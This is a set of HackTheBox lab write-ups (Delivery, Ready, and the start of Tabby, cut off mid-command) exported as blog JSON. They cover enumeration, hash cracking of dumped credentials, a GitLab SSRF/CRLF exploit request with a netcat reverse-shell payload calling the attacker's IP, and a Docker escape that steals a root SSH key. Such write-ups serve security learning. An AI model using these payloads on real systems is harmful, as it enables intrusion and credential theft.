    "content": "Introduction Delivery is an easy difficulty Linux machine based on web sites enumeration and putting the pieces together in order to abuse a ‚Äúby-design‚Äù function and get access to a restricted area where a password is disclosed. Once obtained a low-privileged access to the target it was possible to leak mysql credentials and database contents, obtaining a list of users and relative hashes. Cracking those hashes it was possible to obtain the root password. Because it reused the same credential also for the machine, reusing the same credentials provided a high privileged access to the target.  Improved skills:    Enumeration &amp; smart thinking   Password hunting   hachat / john custom rules   Used tools:    nmap   gobuster   hashcat   john     Enumeration Scanned all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nmap -p- 10.10.10.222 -sS -Pn -oN scans/all-ports.txt -v [sudo] password for kali: ... PORT     STATE SERVICE 22/tcp   open  ssh 80/tcp   open  http 8065/tcp open  unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 55.58 seconds            Raw packets sent: 65621 (2.887MB) | Rcvd: 65796 (2.684MB)   Enumerated open TCP open ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nmap -p22,80,8065 -sV -sC 10.10.10.222 -sT -Pn -oN scans/open-tcp-ports.txt ... PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp   open  http    nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open  unknown | fingerprint-strings: |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: |     HTTP/1.1 400 Bad Request |     Content-Type: text/plain; charset=utf-8 |     Connection: close |     Request |   GetRequest: |     HTTP/1.0 200 OK |     Accept-Ranges: bytes |     Cache-Control: no-cache, max-age=31556926, public |     Content-Length: 3108 |     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com |     Content-Type: text/html; charset=utf-8 |     Last-Modified: Sun, 25 Apr 2021 20:37:14 GMT |     X-Frame-Options: SAMEORIGIN |     X-Request-Id: 4rg44j93ajy9tnsgzhfznr9ngh |     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false |     Date: Sun, 25 Apr 2021 20:44:57 GMT |     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"&gt;&lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=\"mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"application-name\" content=\"Mattermost\"&gt;&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;link re |   HTTPOptions: |     HTTP/1.0 405 Method Not Allowed |     Date: Sun, 25 Apr 2021 20:44:57 GMT |_    Content-Length: 0 ...   Nmap discovered one SSH service runnin on port 22 and two different web services, one of them running on port 80 and the other one running on port 8065.  Enumerated port 80 using web browser:   The site seemed to be a static web site. However the Contact us page revealed a sub-domain that could be interesting:   Added the subdomain to /etc/hosts and enumerated helpdesk.delivery.htb: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nano /etc/hosts ... 10.10.10.222    delivery.htb helpdesk.delivery.htb ...    The site turned to be a support ticket system. Although it was possible to register an account, it was not possible to receive the verification email back. Because of this issue the only way to interact with the application was trough the Guest user.  To spread the attack surface, files and directories of the helpdesk subdomain were also enumerated, allowing to find an additional login form: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ gobuster dir http://helpdesk.delivery.htb -w /usr/share/seclist/Discovery/Web-Contents/raft-medium-custom.txt -x php -t 30 ... /account.php          (Status: 200) [Size: 37319] /ajax.php             (Status: 400) [Size: 17] /api                  (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/api/] /apps                 (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/apps/] /assets               (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/assets/] /avatar.php           (Status: 400) [Size: 40] /captcha.php          (Status: 200) [Size: 3377] /css                  (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/css/] /images               (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/images/] /index.php            (Status: 200) [Size: 4933] /js                   (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/js/] /kb                   (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/kb/] /login.php            (Status: 422) [Size: 5181] /logo.php             (Status: 302) [Size: 0] [--&gt; /assets/default/images/logo.png] /logout.php           (Status: 302) [Size: 13] [--&gt; index.php] /manage.php           (Status: 200) [Size: 63] /offline.php          (Status: 302) [Size: 0] [--&gt; index.php] /open.php             (Status: 200) [Size: 8133] /pages                (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/pages/] /profile.php          (Status: 422) [Size: 5181] /scp                  (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/scp/] /.                    (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/./] /tickets.php          (Status: 422) [Size: 5181] /view.php             (Status: 200) [Size: 5263] /web.config           (Status: 200) [Size: 2197] ...    After having enumerated the port 80, it was time to check also the service on port 8065, which turned to be a Mattermost application:   As for helpdesk.delivery.htb also in this case it was necessary to receive a confirmation email to activate the account. Directories and files enumeration on this service were not fruitful, forcing to proceed ed with further analyses on the other service.  Foothold Guest users are allowed to open support ticket on the Support Center application:   Once opened a ticket, the site allowed to add comments to the ticket sending an email to the corresponding associated inbox. Having access to the ticket summary (through the id) and being able to receive emails, it was possible to abuse the send email function to receive the validation email from the Mattermost application and activate the account.  Registered on Mattermost with 1203785@delivery.htb  Received the validation email in the form of a ticket update:   Activated the arbitrary account and logged inside the application:    Once inside the application some credentials were leaked due to an insecure communication channel and some other information about credentials rules were disclosed:   Leaked credentials were used and a low privileged access was obtained: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ ssh maildeliverer@10.10.10.222 maildeliverer@10.10.10.222's password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5 maildeliverer@Delivery:~$ whoami maildeliverer   Privilege Escalation Local enumeration revealed a mysql service running on localhost: maildeliverer@Delivery:/var/www/osticket$ netstat -polentau | grep 127 (Not all processes could be identified, non-owned process info  will not be shown, you would have to be root to see it all.) tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      110        15591      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          16779      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      0          17735      -                    off (0.00/0/0) ...   osticket configuration file leaked mysql credentials: maildeliverer@Delivery:/var/www/osticket$ cat ./upload/include/ost-config.php ... # Encrypt/Decrypt secret key - randomly generated during installation. define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');  #Default admin email. Used only on db connection issues and related alerts. define('ADMIN_EMAIL','maildeliverer@delivery.htb');  # Database Options # --------------------------------------------------- # Mysql Login info define('DBTYPE','mysql'); define('DBHOST','localhost'); define('DBNAME','osticket'); define('DBUSER','ost_user'); define('DBPASS','!H3l&lt;redacted&gt;');  # Table prefix define('TABLE_PREFIX','ost_'); ...   mattermost configuration file leaked mysql credentials: maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep -i sql -C5         \"DesktopLatestVersion\": \"\",         \"DesktopMinVersion\": \"\",         \"IosLatestVersion\": \"\",         \"IosMinVersion\": \"\"     },     \"SqlSettings\": {         \"DriverName\": \"mysql\",         \"DataSource\": \"mmuser:Crack_...........@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",         \"DataSourceReplicas\": [],         \"DataSourceSearchReplicas\": [],         \"MaxIdleConns\": 20,         \"ConnMaxLifetimeMilliseconds\": 3600000,    Logged within mysql using osticket leaked credentials and extracted password hashes for registered users: maildeliverer@Delivery:/var/www/osticket$ mysql -u ost_user -p -D osticket Enter password: ... MariaDB [osticket]&gt; select username,passwd,email,isadmin from ost_staff; +---------------+--------------------------------------------------------------+----------------------------+---------+ | username      | passwd                                                       | email                      | isadmin | +---------------+--------------------------------------------------------------+----------------------------+---------+ | maildeliverer | $2a$08$VlccTgoFaxEaGJ....................................... | maildeliverer@delivery.htb |       1 | +---------------+--------------------------------------------------------------+----------------------------+---------+ 1 row in set (0.000 sec) ...   Logged within mysql using mattermost leaked credentials and extracted password hashes for registered users: maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p ... MariaDB [(none)]&gt; show databases; +--------------------+ | Database           | +--------------------+ | information_schema | | mattermost         | +--------------------+ 2 rows in set (0.000 sec) ... MariaDB [mattermost]&gt; select username, Password from Users; +----------------------------------+--------------------------------------------------------------+ | username                         | Password                                                     | +----------------------------------+--------------------------------------------------------------+ | surveybot                        |                                                              | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZ...................................... | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1...................................... | | root                             | $2a$10$VM6EeymRxJ29r8W...................................... | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUc...................................... | | channelexport                    |                                                              | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJ...................................... | | maoutis                          | $2a$10$n5KAvICmMNkb.p2...................................... | +----------------------------------+--------------------------------------------------------------+ 8 rows in set (0.000 sec)   Following the hint gave inside the Mattermost application    Also please create a program to help us stop re-using the same passwords everywhere‚Ä¶. Especially those that are a variant of ‚ÄúPleaseSubscribe!‚Äù   it was possible to crack the root user password using hashcat custom rules:  Used rules: https://github.com/praetorian-inc/Hob0Rules/blob/master/d3adhob0.rule ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashid '$2a$10$VM6EeymRxJ29r8.......................................' Analyzing '$2a$10$VM6EeymRxJ29r8.......................................' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashid maildeliverer-admin.passwd --File 'maildeliverer-admin.passwd'-- Analyzing '$2a$10$VM6EeymRxJ29r8.......................................' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt --End of file 'maildeliverer-admin.passwd'--  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ echo 'PleaseSubscribe!' &gt; base_passwords  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ cat mattermost-hashes.passwd| grep root &gt; root.passwd  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashcat root.passwd base_passwords -m3200 -r d3adhob0.rule --force --username --separator \":\" hashcat (v6.1.1) starting... ... $2a$10$VM6EeymRxJ29r8.......................................:PleaseSubscribe!&lt;redacted&gt; ...   The same can be achieved also using john-the-ripper and john custom rules: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ sudo nano /etc/john/john.conf ... [List.Rules:Custom] : # Add one number $[0-9] # Add one number and a sybol $[0-9]$[$%^&amp;*()\\\\-_+=|\\&lt;&gt;\\[\\]{}#@/~] # Add two number $[0-9]$[0-9] # Add two number and a symbol $[0-9]$[0-9]$[$%^&amp;*()\\\\-_+=|\\&lt;&gt;\\[\\]{}#@/~] ...  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ john root.passwd --wordlist=base_passwords --rules=Custom --fork=5                 Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Node numbers 1-5 of 5 (fork) Each node loaded the whole wordfile to memory Press 'q' or Ctrl-C to abort, almost any other key for status PleaseSubscribe!&lt;redacted&gt; (root) ...   Once obtained the root password it was possible to change the account to the root one: maildeliverer@Delivery:~$ su root Password: root@Delivery:/home/maildeliverer# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ip a root Delivery 1df26a288718072c85da8349534ed570 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:cb:0a brd ff:ff:ff:ff:ff:ff     inet 10.10.10.222/24 brd 10.10.10.255 scope global ens192        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:cb0a/64 scope global dynamic mngtmpaddr        valid_lft 86036sec preferred_lft 14036sec     inet6 fe80::250:56ff:feb9:cb0a/64 scope link        valid_lft forever preferred_lft forever     Trophy As always we start with nmap... but it can take a while so I've already ran it - ippsec"
  },
  
  {
    "title": "HackTheBox - Ready",
    "url": "/posts/ready/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-05-14 00:00:00 +0200",
    "content": "Introduction Ready is a medium difficulty Linux box based on a vulnerable version of GitLab Community Edition, which suffers both a Server Side Request Forgery (CVE-2018-1957) and a CRLF injection (CVE-2018-195), allowing to obtain a reverse shell as git user. After obtained a foothold, internal enumeration allowed to find hardcoded-credentials which lead to root access inside the docker container. Docker‚Äôs root user was allowed to run fdisk and mount the external system, making possible to stole root ssh key and obtain a high privileged shell on the original target.  Improved skills:    SSRF Attacks   CRLF Attacks   Docker Escape   Used tools:    nmap   burpsuite   hackvector   netcat     Enumeration Enumerated all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nmap -p- -sS 10.10.10.220 -oN scans/all-tcp-ports.txt -v ... PORT     STATE SERVICE 22/tcp   open  ssh 5080/tcp open  onscreen  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds            Raw packets sent: 65582 (2.886MB) | Rcvd: 65536 (2.621MB)   Enumerated open TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nmap -p22,5080 -sV -sT -sC -A 10.10.10.220 -oN scans/open-tcp-ports.txt Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 16:02 EDT Nmap scan report for 10.10.10.220 Host is up (0.051s latency).  PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open  http    nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using proto 1/icmp) HOP RTT      ADDRESS 1   49.83 ms 10.10.14.1 2   49.93 ms 10.10.10.220  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds   Nmap revealed a GitLab installation on port 5080 and a OpenSSH service on port 22.    A custom account was registered in order to access the GitLab instance:   After get logged in, GitLab Version was enumerated from the ‚Äúhelp‚Äù page:   Foothold Googling around was found that GitLab Community Edition 11.4.7 suffered a Remote Code Execution vulnerability caused by a Server Side Request Forgery (CVE-2018-1957) and a CRFL Injection (CVE-2018-195).  Among the various PoCs, the analysis conducted by liveoverflow was definitely one of the best choice to follow to be able to penetrate this machine.  To summarize the vulnerability, arbitrary code execution can be achieved importing a new git project from the redis localhost port abusing a SSRF vulnerability in conjunction with the CRLF injection. This combination of vulnerabilities allowed to execute arbitrary code inside redis and so obtain a reverse shell.  First, a test project was created and the corresponding import request was intercepted using burpsuite:  POST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 317 Origin: http://10.10.10.220:5080 Connection: close Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all Upgrade-Insecure-Requests: 1  utf8=%E2%9C%93&amp;authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&amp;project%5Bimport_url%5D=test&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=test&amp;project%5Bnamespace_id%5D=3&amp;project%5Bpath%5D=test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0   After that, the request was modified to contain the malicious payload, which in this case send to the attacker machine the string ‚Äúpippo‚Äù. To avoid problems with special characters the url-encode of the whole payload was executed using the burpsuite plugin hackvector. POST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 772 Origin: http://10.10.10.220:5080 Connection: close Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all Upgrade-Insecure-Requests: 1  utf8=%E2%9C%93&amp;authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&amp;project%5Bimport_url%5D=&lt;@urlencode_all&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/  multi  sadd resque:gitlab:queues system_hook_push  lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|echo pippo | nc 10.10.14.24 1234\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"  exec  exec /ssrf.git &lt;@/urlencode_all&gt;&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=test&amp;project%5Bnamespace_id%5D=3&amp;project%5Bpath%5D=test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0    The resulting request was the following one:   Listening on port 1234 we get a response back from the server with the message contained within the payload, meaning that the exploit was successfully executed. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nc -nlvp 1234 listening on [any] 1234 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39212 pippo   A reverse connection can be obtained in the same way upgrading the previous PoC to contain a netcat reverse shell: &lt;@urlencode_all&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/  multi  sadd resque:gitlab:queues system_hook_push  lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| nc 10.10.14.24 1234 -e /bin/bash\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"  exec  exec /ssrf.git &lt;@/urlencode_all&gt;   Using the above payload, a reverse shell was obtained successfully: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nc -nlvp 1234 [sudo] password for kali: listening on [any] 1234 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39772  id uid=998(git) gid=998(git) groups=998(git) which python which python3 /opt/gitlab/embedded/bin/python3 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' git@gitlab:~/gitlab-rails/working$ cd /home cd /home git@gitlab:/home$ ls ls dude git@gitlab:/home$ cd dude cd dude git@gitlab:/home/dude$ ls ls user.txt git@gitlab:/home/dude$ cat user.txt cat user.txt e1e30b052b6ec0670698805d745e7682   Lateral Movement Local enumeration revealed a readable backup file containing credentials and a docker-compose suggesting we were inside docker: git@gitlab:/opt/backup$ cat gitlab.rb | grep password #### Email account password # gitlab_rails['incoming_email_password'] = \"[REDACTED]\" #     password: '_the_password_of_the_bind_user' #     password: '_the_password_of_the_bind_user' #   '/users/password', #### Change the initial default admin password and shared runner registration tokens. # gitlab_rails['initial_root_password'] = \"password\" # gitlab_rails['db_password'] = nil # gitlab_rails['redis_password'] = nil gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" # gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false} ##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab` # postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH' # postgresql['sql_replication_password'] = \"md5 hash of postgresql password\" # You can generate with `gitlab-ctl pg-password-md5 &lt;dbuser&gt;` # redis['password'] = 'redis-password-goes-here' ####! **Master password should have the same value defined in ####!   redis['password'] to enable the instance to transition to/from # redis['master_password'] = 'redis-password-goes-here' # geo_secondary['db_password'] = nil # geo_postgresql['pgbouncer_user_password'] = nil #     password: PASSWORD ###! generate this with `echo -n '$password + $username' | md5sum` # pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)' #     password: MD5_PASSWORD_HASH # postgresql['pgbouncer_user_password'] = nil  git@gitlab:/opt/backup$ cat docker-compose.yml version: '2.4'  services:   web:     image: 'gitlab/gitlab-ce:11.4.7-ce.0'     restart: always     hostname: 'gitlab.example.com'     environment:       GITLAB_OMNIBUS_CONFIG: |         external_url 'http://172.19.0.2'         redis['bind']='127.0.0.1'         redis['port']=6379         gitlab_rails['initial_root_password']=File.read('/root_pass') \t\t... \t\tprivileged: true \t\t...   Because root and nil shared the same password, it was possible to escalate to root reusing nil credentials: git@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# id                                    uid=0(root) gid=0(root) groups=0(root)   Privilege Escalation Because the container had the privileged flag set to true and root access was gained, it was possible to escape from it and get access on the original target mounting the corresponding partition.  A PoC of the method can be read on the HackTricks blog  Enumerated all the partition using fdisk and mounted the target filesystem inside the container: root@gitlab:/mnt# fdisk -l ... Device        Start      End  Sectors Size Type /dev/sda1      2048     4095     2048   1M BIOS boot /dev/sda2      4096 37746687 37742592  18G Linux filesystem /dev/sda3  37746688 41940991  4194304   2G Linux swap root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/  root@gitlab:/mnt# mkdir tmp root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/   Leaked the root private key: root@gitlab:/mnt/tmp/root# ls docker-gitlab  ready-channel  root.txt  snap root@gitlab:/mnt/tmp/root# cd .ssh root@gitlab:/mnt/tmp/root/.ssh# ls authorized_keys  id_rsa  id_rsa.pub root@gitlab:/mnt/tmp/root/.ssh# cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q ... aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY-----   Obtained a high privileged shell using the stolen key: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ nano loot/root.rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn ...  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ ssh root@10.10.10.220 -i loot/root.rsa Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ... Last login: Thu Feb 11 14:28:18 2021 root@ready:~# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a root ready b7f98681505cd39066f67147b103c2b3 br-bcb73b090b3f: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255         inet6 fe80::42:28ff:fe4d:2cbf  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 02:42:28:4d:2c:bf  txqueuelen 0  (Ethernet) \t\t...     Trophy The good thing about science is that it's true whether or not you believe in it. - Neil deGrasse Tyson"
  },
  
  {
    "title": "HackTheBox - Tabby",
    "url": "/posts/tabby/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2020-07-05 00:00:00 +0200",
    "content": "Improved skills:     LFI   Tomcat WAR exploitation   Cracking .zip files   lxd Privilege Escalation   Used tools:     nmap   gobuster   msfvenom   LinEnum.sh   fcrackzip     Introduction &amp; Foothold  Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights.  Let‚Äôs start as always with an nmap scan:  root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open  http    Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31).  Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly  echo \"10.10.10.194¬†¬†¬†¬†megahosting.it\" &gt;&gt; /etc/hosts  Now that we are effectively ready, let‚Äôs start enumerating every page of the first web server.    After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI).      Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods worked‚Ä¶ so I decided to start to enumerate the second web server (tomcat), looking for another entry point.  root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w 